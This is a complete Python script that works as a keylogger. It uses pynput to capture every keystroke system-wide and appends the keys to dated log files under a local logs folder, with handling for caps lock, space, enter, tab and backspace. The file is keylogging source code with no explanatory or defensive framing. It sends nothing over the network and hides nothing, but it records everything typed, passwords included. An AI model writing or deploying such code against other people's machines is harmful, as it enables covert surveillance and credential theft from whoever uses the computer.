import os
from pynput.keyboard import Listener
from datetime import datetime

def getfilepath():
    base = 'logs'
    year = str(datetime.now().year)
    filename = "log_" + datetime.now().strftime('%Y-%m-%d') + ".txt"
    os.makedirs(os.path.join(base, year), exist_ok=True)
    return os.path.join(base, year, filename)

log_file = getfilepath()

################################################################################

state = {'caps_lock':False, 'shift':True}

def writeToFile(key):
    key = str(key)

    if not key.startswith("Key."):
        key = key[1:-1]

    
    print(key)

    if key == "Key.caps_lock":
        state["caps_lock"] = not state["caps_lock"]
    
    if key == "Key.space":
        key = ' '
    if key == "Key.enter":
        key = '\n'
    if key in ["Key.shift", "Key.caps_lock", "Key.alt_l", "Key.shift_r"]:
        key = ''
    if key == "Key.tab":
        key = '  '
    if state["caps_lock"]:
        key = key.upper()

    if key == "Key.backspace":
        with open(log_file, 'rb+') as file:
            try:
                file.seek(-1, 2)
                file.truncate()
            except OSError:
                print("Document is empty.")
    else:
        with open(log_file, 'a') as file:
            file.write(key)

################################################################################

with Listener(on_press=writeToFile) as listener:
    listener.join()